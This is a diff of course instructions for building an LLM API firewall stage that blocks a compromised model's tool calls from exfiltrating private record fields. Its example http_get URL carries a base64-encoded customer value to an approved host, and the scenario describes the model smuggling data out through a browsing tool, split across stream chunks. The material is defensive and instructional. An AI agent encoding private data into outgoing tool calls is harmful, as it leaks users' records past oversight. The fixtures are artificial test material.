@@ -10,12 +10,14 @@ heuristic signal fires and the mock classifier assigns `12`. The compromised
 model returns `http_get` for `allowed.com`, a host the browsing policy permits.
 Its query contains the private record in base64, split across stream chunks.
 
-The earlier checks allow that action. Add a final authorization check that asks
-whether this particular data may leave through this tool and destination.
+Stage 10 allows that action because the tool and hostname are approved. Add a
+final authorization check that asks whether this particular data may leave
+through this tool and destination.
 
 ### Read the trusted export policy
 
-Keep earlier policy fields and support this optional object:
+Add this optional top-level `exports` field to Stage 10's policy. The snippet
+shows only the addition; keep the earlier policy fields alongside it:
 
 ```json
 {
@@ -51,6 +53,12 @@ list marks no results private. An absent `exports` field disables this added
 check. Request text, advertised tools and tool-result names cannot change these
 permissions.
 
+The `private_tools` list identifies producers of private results in history; it
+does not authorize new calls to those tools. The `allowed` list grants export
+permission, while Stage 10's `tools` policy still controls which outgoing calls
+are allowed. For the approved email example, also add `"send_email": {}` to
+`tools`. An export permission cannot override a tool denial.
+
 ### Recover each private field from history
 
 Every request carries the full conversation. Associate a `role: "tool"`
@@ -59,6 +67,7 @@ Use that call's `function.name` to decide whether its result is private:
 
 ```json
 {
+  "model": "course-model",
   "messages": [
     {
       "role": "assistant",
@@ -90,8 +99,10 @@ Protect **each field value independently**, including an email extracted from
 the record. Matching only the serialized record misses that leak. Public tool
 results do not become private merely because they are tool output. Collect the
 values from the original request before redaction, then discard the collection
-when this request finishes. Earlier histories and later HTTP requests must not
-share private-value state. Ordinary text-part messages remain supported.
+when this request finishes. Rebuild it from each incoming request's history. If
+that history repeats a private result, its values are protected again; if a
+later request omits the result, don't remember its values from an earlier HTTP
+request. Ordinary text-part messages remain supported.
 
 ### Match values in complete outgoing arguments
 
@@ -106,6 +117,12 @@ including percent decoding and `+` as a space. This lets a query value
 containing base64 be inspected independently of its surrounding URL. URL query
 encoding must escape a literal base64 `+` as `%2B`.
 
+For example, `https://allowed.com/collect?d=Q3VzdG9tZXItNDgyOQ==` contributes
+both the full URL and the query value `Q3VzdG9tZXItNDgyOQ==`. Decoding that
+query value yields `Customer-4829`, which matches one private field. Trying to
+base64-decode the entire URL would miss it. Percent decoding query syntax is
+separate from the single base64 decode layer.
+
 For each candidate, use the normalization rules from earlier stages and one
 standard-base64 decode layer followed by normalization, as before. Normalize
 private values too, without decoding them. If normalization settings are absent,
@@ -113,6 +130,10 @@ use NFKC and case folding without extra character mappings, while still trying
 one decode layer on candidates. Match a complete normalized private value as a
 substring. Do not recursively decode, join separate argument strings, or infer
 paraphrases. A partial value such as `Customer` is outside this rule's bound.
+
+This export check always tries one base64 layer, including without a
+`normalization` policy. If a candidate doesn't decode to valid UTF-8, skip its
+decoded variant and keep inspecting the candidate itself.
 
 If a call contains any protected value, require a matching approved export for
 that call. Calls containing no private value remain subject to the earlier tool
@@ -133,9 +154,11 @@ shape:
 ```
 
 Reject the whole response before releasing origin bytes or `X-Request-Id`.
-Allowed responses retain their exact original bytes and metadata. Enforce this
-rule even in log mode. Existing canary checks take precedence, followed by tool
-authorization, followed by export authorization.
+Keep the firewall diagnostic headers. The error message must be nonempty and
+must not echo private values or outgoing argument content. Allowed responses
+retain their exact original bytes and metadata. Enforce this rule even in log
+mode. Existing canary checks take precedence, followed by tool authorization,
+followed by export authorization.
 
 For streaming, reuse the completed, ordered tool-call batch assembled at
 `[DONE]`. Check exports before releasing any call. One denied export discards
@@ -160,6 +183,26 @@ redaction pattern list is deliberately empty so the private record remains
 visible to the synthetic compromised model. Earlier redaction checks still run
 when their policies enable patterns.
 
+The launch command starts only your firewall; the tester supplies the mock
+services during tests. For a manual check, save the history example above as
+`request.json`, save the expanded policy to a file, and use its absolute path
+for `--policy`. Run an origin at `--origin` and, if classification is enabled,
+a classifier at `--detector` returning `{"score":12}` for each message. Use
+`"mode": "block"` and the fixture settings described above.
+
+Leave your firewall running and send the saved history from another terminal:
+
+```bash
+curl --silent --include http://127.0.0.1:8080/v1/chat/completions \
+  -H 'Authorization: Bearer course-test-key' \
+  -H 'Content-Type: application/json' \
+  --data-binary @request.json
+```
+
+The `--include` option shows the status and headers alongside the body. Configure
+your origin to return the outgoing call described below in a completion, using
+Stage 10's response format.
+
 The first request includes the record above. The origin returns `http_get` with
 arguments `{"url":"https://allowed.com/collect?d=Customer-4829"}`. Return the
 HTTP `403` error shown above. The origin is contacted once, but the client must
@@ -175,7 +218,12 @@ data: {"error":{"message":"Blocked outgoing tool call","type":"firewall_block","
 ```
 
 The exact nonempty message may differ. There must be no tool fragment or
-`[DONE]`. Controls send the same record through the approved CRM email tool, try
+`[DONE]`, and the message must not echo protected values. To check streaming
+manually, add `"stream": true` to `request.json`, use curl's `--no-buffer`
+option, and configure your origin to split the call across SSE events followed
+by `[DONE]`, as in Stage 10.
+
+Controls send the same record through the approved CRM email tool, try
 exporting only its email field, and send a non-private value through the
 browsing URL. Changed policies, empty export permissions, log mode, complete
 batches and separate requests also exercise the rule. Each request has a
